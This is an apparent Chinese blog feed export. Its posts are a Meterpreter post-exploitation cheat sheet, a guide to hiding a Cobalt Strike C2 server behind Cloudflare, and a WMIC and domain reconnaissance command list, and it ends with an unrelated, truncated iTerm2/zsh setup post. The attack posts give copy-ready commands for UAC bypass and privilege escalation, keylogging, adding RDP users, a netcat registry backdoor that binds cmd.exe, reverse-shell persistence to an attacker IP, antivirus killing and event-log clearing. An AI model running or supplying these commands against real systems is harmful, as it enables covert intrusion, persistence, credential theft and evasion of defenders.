class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>getsystem</code>创建一个新的<strong>Windows</strong>服务，设置为<strong>SYSTEM</strong>运行，当它启动时连接到一个命名管道。</li><li><code>getsystem</code>产生一个进程，它创建一个命名管道并等待来自该服务的连接。</li><li><strong>Windows</strong>服务已启动，导致与命名管道建立连接。</li><li>该进程接收连接并调用<code>ImpersonateNamedPipeClient</code>，从而为<strong>SYSTEM</strong>用户创建模拟令牌。</li></ul><p>然后用新收集的<strong>SYSTEM</strong>模拟令牌产生<strong>cmd.exe</strong>，并且我们有一个<strong>SYSTEM</strong>特权进程。</p><h4 id="4-14-2-bypassuac-rb"><a href="#4-14-2-bypassuac-rb" class="headerlink" title="4.14.2 bypassuac.rb"></a>4.14.2 bypassuac.rb</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bypassuac#内置多个pypassuac脚本，原理有所不同，使用方法类似，运行后返回一个新的会话，需要再次执行getsystem获取系统权限，如：use exploit&#x2F;windows&#x2F;local&#x2F;bypassuacuse exploit&#x2F;windows&#x2F;local&#x2F;bypassuac_injectionuse windows&#x2F;local&#x2F;bypassuac_vbsuse windows&#x2F;local&#x2F;ask如使用bypassuac.rb脚本：msf &gt; use exploit&#x2F;windows&#x2F;local&#x2F;bypassuacmsf &gt; set SESSION 2msf &gt; run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-14-3-内核漏洞提权"><a href="#4-14-3-内核漏洞提权" class="headerlink" title="4.14.3 内核漏洞提权"></a>4.14.3 内核漏洞提权</h4><p>可先利用enum_patches模块收集补丁信息，然后查找可用的exploits进行提权，需要退出当前连接</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;enum_patches  #查看补丁信息msf &gt; use exploit&#x2F;windows&#x2F;local&#x2F;ms13_053_schlampereimsf &gt; set SESSION 2msf &gt; exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-15-远程桌面-截图"><a href="#4-15-远程桌面-截图" class="headerlink" title="4.15 远程桌面/截图"></a>4.15 远程桌面/截图</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">enumdesktops  #查看可用的桌面getdesktop    #获取当前meterpreter 关联的桌面set_desktop   #设置meterpreter关联的桌面  -h查看帮助screenshot  #截屏use espia  #或者使用espia模块截屏  然后输入screengrabrun vnc  #使用vnc远程桌面连接<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-16-rdp-用户添加"><a href="#4-16-rdp-用户添加" class="headerlink" title="4.16 rdp/用户添加"></a>4.16 rdp/用户添加</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter &gt; run getgui –h[!] Meterpreter scripts are deprecated. Try post&#x2F;windows&#x2F;manage&#x2F;enable_rdp.[!] Example: run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp OPTION&#x3D;value [...]Windows Remote Desktop Enabler Meterpreter ScriptUsage: getgui -u &lt;username&gt; -p &lt;password&gt;Or:    getgui -eOPTIONS:    -e        Enable RDP only.    -f &lt;opt&gt;  Forward RDP Connection.    -h        Help menu.    -p &lt;opt&gt;  The Password of the user to add.    -u &lt;opt&gt;  The Username of the user to add.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>例：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#1run getgui -e #开启远程桌面run getgui -u lltest2 -p 123456   #添加用户run getgui -f 6661 –e   #3389端口转发到6661#2run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp  #开启远程桌面run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp USERNAME&#x3D;www2 PASSWORD&#x3D;123456 #添加用户run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp FORWARD&#x3D;true LPORT&#x3D;6662  #将3389端口转发到6662<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-17-键盘记录"><a href="#4-17-键盘记录" class="headerlink" title="4.17 键盘记录"></a>4.17 键盘记录</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">keyscan_start  #开始键盘记录keyscan_dump   #导出记录数据keyscan_stop #结束键盘记录这边要说一点就是，导出记录的话要在keyscan_stop命令之前，不然结束了就无法导出了meterpreter &gt; keyscan_startStarting the keystroke sniffer ...meterpreter &gt; keyscan_dump  #每次转储后，命令都会打印出来，然后再次转储的话是从上一次键盘结束开始记录的Dumping captured keystrokes...fffff&lt;CR&gt;&lt;CR&gt;&lt;CR&gt;fff&lt;CR&gt;&lt;CR&gt;&lt;CR&gt;meterpreter &gt; keyscan_stopStopping the keystroke sniffer...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-18-sniffer-抓包"><a href="#4-18-sniffer-抓包" class="headerlink" title="4.18 sniffer 抓包"></a>4.18 sniffer 抓包</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">use sniffersniffer_interfaces   #查看网卡sniffer_start 2   #选择网卡 开始抓包sniffer_stats 2   #查看状态sniffer_dump 2 &#x2F;tmp&#x2F;lltest.pcap  #导出pcap数据包sniffer_stop 2   #停止抓包<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-注册表操作"><a href="#5-注册表操作" class="headerlink" title="5  注册表操作"></a>5  注册表操作</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter reg –hUsage: reg [command] [options]Interact with the target machine&#39;s registry.OPTIONS:    -d &lt;opt&gt;  The data to store in the registry value.#注册表中值的数据    -h        Help menu.    -k &lt;opt&gt;  The registry key path (E.g. HKLM\Software\Foo).#注册表键路径    -r &lt;opt&gt;  The remote machine name to connect to (with current process credentials#要连接的远程计算机名称（使用当前进程凭据）    -t &lt;opt&gt;  The registry value type (E.g. REG_SZ).#注册表值类型    -v &lt;opt&gt;  The registry value name (E.g. Stuff).#注册表键名称    -w        Set KEY_WOW64 flag, valid values [32|64].#设置32位注册列表还是64位COMMANDS:    enumkey  Enumerate the supplied registry key [-k &lt;key&gt;]#枚举可获得的键    createkey  Create the supplied registry key  [-k &lt;key&gt;]#创建提供的注册表项    deletekey  Delete the supplied registry key  [-k &lt;key&gt;]#删除提供的注册表项    queryclass Queries the class of the supplied key [-k &lt;key&gt;]#查询键值数据    setval Set a registry value [-k &lt;key&gt; -v &lt;val&gt; -d &lt;data&gt;]#设置键值    deleteval  Delete the supplied registry value [-k &lt;key&gt; -v &lt;val&gt;]#删除提供的注册表值    queryval Queries the data contents of a value [-k &lt;key&gt; -v &lt;val&gt;]#查询值的数据内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注册表设置nc后门</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">upload &#x2F;Users&#x2F;ascotbe&#x2F;Downloads&#x2F;netcat-1.11&#x2F;nc.exe C:\\windows\\system32 #上传nc,前面的是你要上传文件的位置reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的keyreg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &#39;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&#39; #设置键值reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值nc -v 192.168.0.142 443  #攻击者连接nc后门<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="6-令牌操纵"><a href="#6-令牌操纵" class="headerlink" title="6.令牌操纵"></a>6.令牌操纵</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#假冒令牌use incognito      help incognito  #查看帮助list_tokens -u    #查看可用的tokenimpersonate_token &#39;NT AUTHORITY\SYSTEM&#39;  #假冒SYSTEM token,或者用下面的impersonate_token NT\ AUTHORITY\\SYSTEM #不加单引号 需使用\\execute -f cmd.exe -i –t    # -t 使用假冒的token 执行或者直接shellrev2self   #返回原始token<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>steal_token 窃取令牌</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter &gt; steal_tokenUsage: steal_token [pid]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="7-关闭杀软"><a href="#7-关闭杀软" class="headerlink" title="7 关闭杀软"></a>7 关闭杀软</h2><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">meterpreter &gt; run killav<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="8-后门植入"><a href="#8-后门植入" class="headerlink" title="8 后门植入"></a>8 后门植入</h2><h5 id="persistence启动项后门"><a href="#persistence启动项后门" class="headerlink" title="persistence启动项后门"></a>persistence启动项后门</h5><p>在<code>C:\Users\XXXXX\AppData\Local\Temp\</code>目录下，上传一个<strong>vbs</strong>脚本<br>在注册表<code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run\</code>加入开机启动项</p><pre class="line-numbers language-none"><code class="language-none">BASHrun persistence –h  #查看帮助run persistence -X -i 5 -p 6661 -r 192.168.159.134#-X指定启动的方式为开机自启动，-i反向连接的时间间隔(5s) –r 指定攻击者的ip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>连接后门</strong></p><pre class="line-numbers language-none"><code class="language-none">BASHmsf &gt; use exploit&#x2F;multi&#x2F;handlermsf &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcpmsf &gt; set LHOST 192.168.159.134msf &gt; set LPORT 6661msf &gt; exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="metsvc服务后门"><a href="#metsvc服务后门" class="headerlink" title="metsvc服务后门"></a>metsvc服务后门</h4><p>在<code>C:\Users\XXXXX\AppData\Local\Temp\</code>上传了三个文件（<strong>metsrv.x86.dll</strong>、<strong>metsvc-server.exe</strong>、<strong>metsvc.exe</strong>），通过服务启动，服务名为<strong>meterpreter</strong></p><pre class="line-numbers language-none"><code class="language-none">BASHrun metsvc –h   # 查看帮助run metsvc –A   #自动安装后门<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>连接后门</strong></p><pre class="line-numbers language-none"><code class="language-none">BASHmsf &gt; use exploit&#x2F;multi&#x2F;handlermsf &gt; set payload windows&#x2F;metsvc_bind_tcpmsf &gt; set RHOST 192.168.159.144msf &gt; set LPORT 31337msf &gt; exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参考链接</p><p>：<a href="https://xz.aliyun.com/t/2536">https://xz.aliyun.com/t/2536</a></p><p>：<a href="https://www.ascotbe.com/2020/05/06/MeterpreterCommand/">https://www.ascotbe.com/2020/05/06/MeterpreterCommand/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>域名，DNS 配置</title>
      <link href="2021/05/27/yu-ming-dns-pei-zhi/"/>
      <url>2021/05/27/yu-ming-dns-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="域名-DNS-相关配置"><a href="#域名-DNS-相关配置" class="headerlink" title="域名/DNS 相关配置"></a>域名/DNS 相关配置</h1><span id="more"></span><h2 id="lt-1-域名-DNS配置"><a href="#lt-1-域名-DNS配置" class="headerlink" title="&lt;1 域名/DNS配置"></a>&lt;1 域名/DNS配置</h2><h3 id="lt-1-1注册google-邮箱"><a href="#lt-1-1注册google-邮箱" class="headerlink" title="&lt;1.1注册google 邮箱"></a>&lt;1.1注册google 邮箱</h3><p>需要提前注册好，这里不做过多描述</p><h3 id="lt-1-2注册免费域名"><a href="#lt-1-2注册免费域名" class="headerlink" title="&lt;1.2注册免费域名"></a>&lt;1.2注册免费域名</h3><p>地址：<a href="https://my.freenom.com/">https://my.freenom.com/</a></p><p>下图几个域名后缀为免费域名</p><img src="/2021/05/27/yu-ming-dns-pei-zhi/img-1.png" class="slug"><p>这里需要先把vpn改到全局代理，然后注册域名，注册完以后需要先修改用户信息，再去付款，最高可以选择一年，然后去goole邮箱激活</p><h3 id="lt-1-3注册登录免费CDN"><a href="#lt-1-3注册登录免费CDN" class="headerlink" title="&lt;1.3注册登录免费CDN"></a>&lt;1.3注册登录免费CDN</h3><p>地址：<a href="https://dash.cloudflare.com/">https://dash.cloudflare.com/</a></p><img src="/2021/05/27/yu-ming-dns-pei-zhi/img-2.png" class="slug"><p>注册完后，输入子域名</p><img src="/2021/05/27/yu-ming-dns-pei-zhi/img-3.png" class="slug"><p>将ns地址填入</p><img src="/2021/05/27/yu-ming-dns-pei-zhi/img-4.png" class="slug"><p>即可</p><p>参考：<a href="https://mp.weixin.qq.com/s/S_REwcYlJGpyiJb3PIwsOQ">https://mp.weixin.qq.com/s/S_REwcYlJGpyiJb3PIwsOQ</a></p><p><a href="https://zhujitips.com/328">https://zhujitips.com/328</a></p><h2 id="lt-2-C2服务器隐藏"><a href="#lt-2-C2服务器隐藏" class="headerlink" title="&lt;2 C2服务器隐藏"></a>&lt;2 C2服务器隐藏</h2><p>链接cs服务端，在这之后新建一个监听器为 http 的，然后 Hosts 和 Beacons 都设置为域名：</p><img src="/2021/05/27/yu-ming-dns-pei-zhi/img-5.png" class="slug"><p>注意 http port 端口只能设置成以下几个：</p><pre class="line-numbers language-none"><code class="language-none">80,8080,8880,2052,2082,2086,2095<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果是 https 的监听端口只能设置成以下几个：</p><pre class="line-numbers language-none"><code class="language-none">443,2053,2083,2087,2096,8443;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>因为这是 Cloudflare 仅支持的端口，所以没办法把监听器设置成其他端口。</p><p>尝试上线</p><img src="/2021/05/27/yu-ming-dns-pei-zhi/img-6.png" class="slug">]]></content>
      
      
      
        <tags>
            
            <tag> 配置 </tag>
            
            <tag> 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网信息收集</title>
      <link href="2021/04/20/nei-wang-xin-xi-shou-ji/"/>
      <url>2021/04/20/nei-wang-xin-xi-shou-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><span id="more"></span><h2 id="1-WMIC-基础语法"><a href="#1-WMIC-基础语法" class="headerlink" title="1.WMIC 基础语法"></a>1.WMIC 基础语法</h2><h3 id="1-1-语法介绍"><a href="#1-1-语法介绍" class="headerlink" title="1.1 语法介绍"></a>1.1 语法介绍</h3><p>wmic命令行是用来管理WMI系统的， 算是win的插件 ， 用户可以使用 WMI 管理本地和远程计算机。</p><p>WMI在渗透测试中不需要下载和安装，是Windows系统自带功能，和cmd一样用</p><p>在整个运行过程都在计算机内存中发生，不会留下任何操作痕迹。</p><h3 id="1-2-简单实用"><a href="#1-2-简单实用" class="headerlink" title="1.2 简单实用"></a>1.2 简单实用</h3><h4 id="1-2-1-查看帮助"><a href="#1-2-1-查看帮助" class="headerlink" title="1.2.1 查看帮助"></a>1.2.1 查看帮助</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">wmic &#x2F;?  #查看全局命令process &#x2F;? #进程管理帮助wmic process get &#x2F;?   #属性获取操作帮助<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="1-2-2-常用命令"><a href="#1-2-2-常用命令" class="headerlink" title="1.2.2 常用命令"></a>1.2.2 常用命令</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#获取系统正在运行的进程、进程文件的路径、进程IDwmic process get caption,executablepath,processid#获取系统当前正在运行的服务wmic service where (state&#x3D;&#39;runing&#39;) get name,processid,pathname,startmode,caption#查看服务信息wmic service list brief#获取杀软详情wmic &#x2F;Node:localhost &#x2F;namespace:\\root\securitycenter2 path antivirusproduct GET displayName,productState,pathToSignedProductExe &#x2F;Format:List#获取补丁信息wmic qfe get Caption,Description,HotFixID,InstalledOn#判断是否是虚拟机wmic onboarddevice get Description,DeviceType,Enabled,Status &#x2F;format:list#安装了那些软件wmic product get name,version#获取本地安装程序wmic &#x2F;NAMESPACE:&quot;\\root\CIMV2&quot; PATH Win32_Product get name &#x2F;FORMAT:table#系统环境变量wmic environment get Description,VariableValue#计算机品牌，型号、名称、名字wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles &#x2F;format:list#获取系统驱动情况wmic sysdriver get Caption,Name,PathName,ServiceType,State,Status &#x2F;format:list#查看驱动器wmic logicaldisk get caption,description,providername  #查看当前操作系统wmic OS get Caption,CSDVersion,OSArchitecture,Version#查看开机自启动wmic startup get caption,command#查看共享文件wmic share get name,path,status<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-2-3-操作用户"><a href="#1-2-3-操作用户" class="headerlink" title="1.2.3 操作用户"></a>1.2.3 操作用户</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#搜索用户账户wmic useraccount list brief#锁定用户账号wmic useraccount where name&#x3D;&#39;hacker&#39; set disabled&#x3D;false#用户账号重命名wmic useraccount where name&#x3D;&#39;hacker&#39; rename hacker#限制用户修改密码wmic useraccount where name&#x3D;&#39;hacker&#39; set passwordchangeable&#x3D;false#搜索登录用户wmic logon list brief#搜索计算机域控制器wmic ntdomain list brief<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-2-4-操作服务"><a href="#1-2-4-操作服务" class="headerlink" title="1.2.4 操作服务"></a>1.2.4 操作服务</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#卸载和重装程序wmic product where &quot;name like &#39;%forit%&#39;&quot; get name#停止运行服务,主要是关闭杀软Wmic process where name&#x3D;&quot;XXX.exe&quot; call terminatewmic process where name&#x3D;&quot;explorer.exe&quot; call terminate<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="1-2-5-清理日志"><a href="#1-2-5-清理日志" class="headerlink" title="1.2.5 清理日志"></a>1.2.5 清理日志</h4><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">wmic nteventlog where filename&#x3D;&#39;system&#39; cleareventlog<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2-本机信息"><a href="#2-本机信息" class="headerlink" title="2.  本机信息"></a>2.  本机信息</h2><h3 id="2-1-介绍"><a href="#2-1-介绍" class="headerlink" title="2.1 介绍"></a>2.1 介绍</h3><p>当主机上线时候，第一件事就是搜集有用信息，判断这是什么系统、找杀软、找漏洞来提权、判断内网等等。</p><p>而不是无头苍蝇，上来就乱搞一通。</p><h3 id="2-2-命令"><a href="#2-2-命令" class="headerlink" title="2.2 命令"></a>2.2 命令</h3><h4 id="2-2-1-系统与配置信息"><a href="#2-2-1-系统与配置信息" class="headerlink" title="2.2.1 系统与配置信息"></a>2.2.1 系统与配置信息</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#主机信息hostname #查看当前操作系统，重点查看版本、位数、补丁信息systeminfo systeminfo | findstr &#x2F;B &#x2F;C:&quot;Os Name&quot; &#x2F;C:&quot;OS Version&quot;#查看系统架构echo %PROCESSOR_ARCHITECTURE%#查看驱动情况DRIVERQUERY#查看磁盘驱动器，有几个磁盘wmic logicaldisk get caption,description,providername#host 信息type C:\\windows\system32\drivers\etc\hosts#如果安装iis服务器可以查看iis配置信息type C:\\windows\system32\inetsrv\config\applicationHost.config<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-2-2-软件与进程信息"><a href="#2-2-2-软件与进程信息" class="headerlink" title="2.2.2 软件与进程信息"></a>2.2.2 软件与进程信息</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#主要是看安装软件和版本信息，查响应版本漏洞wmic product get name,version#查看当前进程列表和进程用户，分析软件、邮件客户端、VPN和杀软等tasklist &#x2F;svcwmic process list brief#查看AV安装情况wmic &#x2F;Node:localhost &#x2F;Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName &#x2F;Format:List#已启动程序的信息，查看开机自启动wmic startup get command,caption<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-2-3-服务信息"><a href="#2-2-3-服务信息" class="headerlink" title="2.2.3 服务信息"></a>2.2.3 服务信息</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#查看启动的服务net start#查看服务信息q#查询服务的详细信息sc querys<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-2-4-计划任务"><a href="#2-2-4-计划任务" class="headerlink" title="2.2.4 计划任务"></a>2.2.4 计划任务</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">schtasks #计划任务参考参数&#x2F;Create  # 创建计划任务&#x2F;Delete  #删除计划任务&#x2F;Query #显示所有的计划任务&#x2F;Change  #更改计划任务&#x2F;Run。# 运行计划任务&#x2F;End。#终止当前计划任务&#x2F;ShowSid  #显示与计划任务名称相应的安全标识符&#x2F;？  #显示此帮助消息#查询所有的计划任务schtasks &#x2F;query &#x2F;fo list &#x2F;v<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-2-5-用户信息"><a href="#2-2-5-用户信息" class="headerlink" title="2.2.5 用户信息"></a>2.2.5 用户信息</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#查看主机开机时间net statistics workstation#查询已经在线用户，注意管理员是否在线query user || qwinstaquery session #查看当前用户权限，主要是判断现在是本地平台用户、本地管理员、还是域内用户whoamiwhoami &#x2F;all# 查看本地用户列表，推测命名规则net user#查看所有组名，net localgroup#然后可以查看指定组中的成员列表，比如查询本地管理员组看到本地一个管理员，还一个域的Domainadmins为域内机器的本地管理员用户net localgroup administrators<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-2-6-网络配置信息"><a href="#2-2-6-网络配置信息" class="headerlink" title="2.2.6 网络配置信息"></a>2.2.6 网络配置信息</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#查看网络信息ipconfig &#x2F;all#查看路由器和路由表，可以判断内网的地址段route printarp -A#查看主机共享列表，可访问的共享列表net sharewmic share get name,path,status#查看主机开放端口以及链接状态，TCP&#x2F;UDPnetstat -anonetstat -anob #查看对应的程序，需要权限#通过注册表查看代理情况REG QUERY &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3域信息收集"><a href="#3域信息收集" class="headerlink" title="3域信息收集"></a>3域信息收集</h2><h3 id="3-1-域内信息收集"><a href="#3-1-域内信息收集" class="headerlink" title="3.1 域内信息收集"></a>3.1 域内信息收集</h3><h4 id="3-1-1主机信息收集"><a href="#3-1-1主机信息收集" class="headerlink" title="3.1.1主机信息收集"></a>3.1.1主机信息收集</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">shell systeminfo #查看主机信息，存在域信息<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2021/04/20/nei-wang-xin-xi-shou-ji/img-1.png" class="slug"><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">#获取域名ipshell nslookup god.orgping god.org #查询当前会话登陆的是域还是本地工作组，是域的话可以查DNS和域用户信息shell config workstation<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2021/04/20/nei-wang-xin-xi-shou-ji/img-2.png" class="slug"><h4 id="3-1-2域基本信息查询"><a href="#3-1-2域基本信息查询" class="headerlink" title="3.1.2域基本信息查询"></a>3.1.2域基本信息查询</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">shell net view #查看工作组内主机shell net view&#x2F;domain #查看有几个域shell net view&#x2F;domain：god.org  #查看指定域内主机shell net accounts &#x2F;domain   #获取域密码策略shell nltest &#x2F;domain_trusts #获取域信任信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-1-3-域内用户和管理员信息"><a href="#3-1-3-域内用户和管理员信息" class="headerlink" title="3.1.3.域内用户和管理员信息"></a>3.1.3.域内用户和管理员信息</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">net user &#x2F;domain #查询域内用户列表net user Administrator &#x2F;domamin # 查询指定域用户信息net group &#x2F;doamin  #查看域内的组，判断每个组的功能net group &quot;domain admins&quot; &#x2F;domain #查询域管理员组内的用户net group &quot;Domain computers&quot; &#x2F;domain  #查询域成员计算机列表，对应的是主机的机器账户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-1-4判断主域（域控）"><a href="#3-1-4判断主域（域控）" class="headerlink" title="3.1.4判断主域（域控）"></a>3.1.4判断主域（域控）</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">net time &#x2F;domain #域服务器一般会作为时间服务器使用，就可以获得域控地址存在域，但当前用户不是域用户会拒绝访问；是域用户就获得相应地址；显示找不到域则是工作组环境ping DC.domain.test #通过ping获取域控nltest &#x2F;DCLIST:domainnetdom query pdcnet group &quot;Domain controllers&quot; &#x2F;domain # 查看域控制器的机器账户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 内网 </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>iterm2配置</title>
      <link href="2021/03/27/iterm2-pei-zhi/"/>
      <url>2021/03/27/iterm2-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h1 id="ITerm2-配置"><a href="#ITerm2-配置" class="headerlink" title="ITerm2 配置"></a>ITerm2 配置</h1><span id="more"></span><h2 id="lt-1-安装oh-my-zsh"><a href="#lt-1-安装oh-my-zsh" class="headerlink" title="&lt;1 安装oh-my-zsh"></a>&lt;1 安装oh-my-zsh</h2><h3 id="lt-1-1-查看系统存在几个shell"><a href="#lt-1-1-查看系统存在几个shell" class="headerlink" title="&lt;1.1 查看系统存在几个shell"></a>&lt;1.1 查看系统存在几个shell</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">cat &#x2F;etc&#x2F;shell<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># List of acceptable shells for chpass(1).# Ftpd will not allow users to connect who are not using# one of these shells.&#x2F;bin&#x2F;bash&#x2F;bin&#x2F;csh&#x2F;bin&#x2F;dash&#x2F;bin&#x2F;ksh&#x2F;bin&#x2F;sh&#x2F;bin&#x2F;tcsh&#x2F;bin&#x2F;zsh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>bash是mac中terminal自带的shell，把它换成zsh，这个的功能要多得多。拥有语法高亮，命令行tab补全，自动提示符，显示Git仓库状态等功能</p><p>设置默认shell</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">chsh -s &#x2F;bin&#x2F;zsh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="lt-1-2-安装oh-my-zsh"><a href="#lt-1-2-安装oh-my-zsh" class="headerlink" title="&lt;1.2 安装oh-my-zsh"></a>&lt;1.2 安装oh-my-zsh</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">https:&#x2F;&#x2F;github.com&#x2F;ohmyzsh&#x2F;ohmyzsh #github地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">cp -r ohmyzsh ~&#x2F;.oh-my-zsh## 复制.zshrccp ohmyzsh&#x2F;templates&#x2F;zshrc.zsh-template ~&#x2F;.zshrc## shell换成zshchsh -s &#x2F;bin&#x2F;zsh #安装好之后，需要把 Zsh 设置为当前用户的默认 